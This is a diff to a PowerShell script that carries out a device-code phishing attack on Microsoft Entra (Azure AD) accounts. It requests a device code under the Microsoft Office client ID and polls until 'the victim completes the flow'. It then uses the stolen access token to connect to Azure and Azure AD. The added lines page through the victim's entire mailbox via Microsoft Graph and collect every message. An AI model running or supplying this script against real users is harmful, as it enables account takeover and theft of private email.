@@ -39,10 +39,10 @@ function Convert-JWTtoken {
 
 #Create body to start device-code flow and generate Device Code.
 $body = @{
-    "client_id" = "ee272b19-4411-433f-8f28-5c13cb6fd407" #use Microsoft Office as client app/service principal, this is visible to the end user during the flow
+    "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c" #use Microsoft Office as client app/service principal, this is visible to the end user during the flow
     #$Client_id = '1950a258-227b-4e31-a9cf-717495945fc2' #use Micrsooft Azure PowerShell as client app/service principal, this is visible to the end user during the flow
-    #"resource" = "https://graph.windows.net" #Use Azure Graph as resource/backend API target
-    "resource"  = "https://management.azure.com/" #Use Azure Resource Manager as resource/backend API target, Access tokens for this API can also be used for Graph..
+    "resource" = "https://graph.windows.net" #Use Azure Graph as resource/backend API target
+    #"resource"  = "https://management.azure.com/" #Use Azure Resource Manager as resource/backend API target
 }
 
 $authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
@@ -53,9 +53,9 @@ $authResponse
 #Post the following body to the posturi untill you receive your access token (after the victim completes the flow) 
 $body = @{
     "client_id"  = "d3590ed6-52b3-4102-aeff-aad2292ab01c" #Microsoft Office
-    #$ClientId = '1950a258-227b-4e31-a9cf-717495945fc2' #Micrsooft Azure PowerShell
-    #"resource" =  "https://graph.windows.net"
-    "resource"   = "https://management.azure.com/"
+    #"ClientId" = '1950a258-227b-4e31-a9cf-717495945fc2' #Micrsooft Azure PowerShell
+    "resource" =  "https://graph.windows.net"
+    #"resource"   = "https://management.azure.com/"
     "code"       = ($authResponse.device_code)
     "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
 }
@@ -65,5 +65,22 @@ $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri $posturi -Body 
 #You could now use response.access_token for direct access to the API, below shows how to use it with your favorite 
 #Powershell modules. The ARM Access token will work on both APIs. 
 $jwt = Convert-JWTtoken ($response.access_token) 
-Connect-azaccount -accesstoken ($response.access_token) -accountid ($jwt.oid)
+
+#Example to query graph directly for all of the victims email messages. 
+$Uri = 'https://graph.microsoft.com/beta/me/messages'
+$accessToken = ($response.access_token)
+[array]$victimsMails = $null
+[array]$mails = Invoke-RestMethod -Method Get -Uri $Uri -Headers @{"Authorization" = "Bearer $accessToken"}
+While ($mails.'@odata.nextLink'){
+    Try {
+        $mails += Invoke-RestMethod -Method Get -Uri $mails.'@odata.nextLink' -Headers @{"Authorization" = "Bearer $accessToken" }
+    }
+    Catch {
+        Throw $_
+    }
+    $victimsMails += $mails
+}
+
+Connect-AzAccount -accesstoken ($response.access_token) -accountid ($jwt.oid)
 Connect-AzureAD -AadAccessToken ($response.access_token) -AccountId ($jwt.oid) -TenantId ($jwt.tid)
+
